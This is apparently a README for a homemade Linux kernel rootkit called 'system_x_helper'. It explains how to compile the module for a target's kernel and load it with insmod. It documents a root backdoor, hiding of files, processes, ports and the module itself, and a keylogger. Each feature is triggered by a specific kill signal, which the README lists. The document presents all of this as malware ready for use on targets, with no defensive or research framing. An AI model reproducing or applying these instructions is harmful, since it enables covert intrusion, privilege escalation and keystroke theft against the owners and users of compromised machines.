# My very own rootkit!
Most code copied from [The Xcellerator](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques)

Keylogger from [jarun](https://github.com/jarun/spy)

The rootkit's name is `system_x_helper`

---

## How to install

First get the target's kernel version so we can compile (run `$ uname -r`)
Next, in the `Makefile` replace `$(shell uname -r)` with the output of the target's output

Install `make build-essential linux-headers-$(uname -r)`

Now run `$ make`

Finaly, run `$ /sbin/insmod system_x_helper.ko`

---

## Functionality
- Uses `kill` to run different things
- Gives root access
- Hide files/directories
- Hide processes
- Hide open ports/active connections
- Hide itself
- Keylogger (log: `/sys/kernel/debug/system_x_kisni/system_x_keys`)

---

## Kill flags for each functionality

#### Root backdoor
`$ kill -64 9843`
> 9843 can be any number

#### Toggle hide/unhide self (Hidden by default)
`$ kill -63 9489`
> 9489 can be any number

#### Toggle hide specified process (Can hide up to 16)
`$ kill -62 <PID to hide/unhide>`

#### Hide ports
`$ kill -61 <port number to hide>`

#### Toggle keylogger
`$ kill -60 9028`
> 9028 can be any number

---

## Hidden files/directories

#### Prefix
`system_x_`
> hides the file/directory

---

# LISCENSE
